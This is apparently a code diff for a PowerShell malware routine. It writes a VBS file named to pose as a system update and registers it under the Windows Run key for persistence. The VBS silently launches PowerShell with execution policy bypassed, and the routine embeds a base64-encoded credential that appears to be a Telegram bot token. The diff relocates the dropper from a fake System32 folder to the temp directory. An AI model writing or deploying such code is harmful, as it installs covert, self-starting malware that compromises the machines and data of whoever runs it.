@@ -1,8 +1,8 @@
 function get-a {
 
-New-Item -Path "\\?\C:\Windows \System32" -ItemType Directory -Force
+New-Item -Path "$env:temp/SystemUpdate.vbs" -ItemType Directory -Force
 
-Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" "SystemUpdate" "wscript `"\\?\C:\Windows \System32\SystemUpdate.vbs`"" -Force
+Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" "SystemUpdate" "wscript `"$env:temp/SystemUpdate.vbs`"" -Force
 
 $psScript = @"
 $ojkr = "Nzg5Mzk3MzUxNTpBQUY3Wm9DeWMwZThjdjhjSGxBRU5HUy1DcDlLbEl1UlB3aw=="
@@ -50,7 +50,7 @@ $vbss = @"
 Set s = CreateObject("Wscript.Shell")
 s.Run "powershell -NoProfile -ExecutionPolicy Bypass -Command ""$escapedScript""", 0, False
 "@
-[System.IO.File]::WriteAllText("\\?\C:\Windows \System32\SystemUpdate.vbs", $vbss, [System.Text.Encoding]::ASCII)
+[System.IO.File]::WriteAllText("$env:temp/SystemUpdate.vbs", $vbss, [System.Text.Encoding]::ASCII)
 
 }
 
